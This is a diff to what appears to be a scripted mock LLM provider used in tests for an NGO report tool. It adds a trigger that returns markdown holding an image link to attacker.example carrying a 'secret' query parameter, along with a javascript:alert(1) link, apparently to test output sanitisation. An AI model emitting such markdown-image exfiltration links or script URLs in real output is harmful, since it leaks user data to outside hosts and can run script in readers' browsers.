@@ -20,6 +20,9 @@ export function reply(prompt: PromptMessage[]): string {
   const last = textOf([...prompt].reverse().find((m) => m.role === "user")?.content);
   const lens = last.match(/perspective of: ([^.]+)\./)?.[1];
   if (/FAIL_PLEASE/.test(last)) throw new Error("Scripted provider failure");
+  if (/INJECT_PLEASE/.test(last)) {
+    return "Summary ![chart](https://attacker.example/leak?q=secret) and [source](javascript:alert(1)) and [ok](https://example.org)";
+  }
   if (/Alignment Report/.test(last)) {
     return "# NGO Strategy and Alignment Report\n\n## Organizational purpose\nScripted purpose." +
       marker({ stage: "report", current: 0, covered: [1, 2], lens: "" });
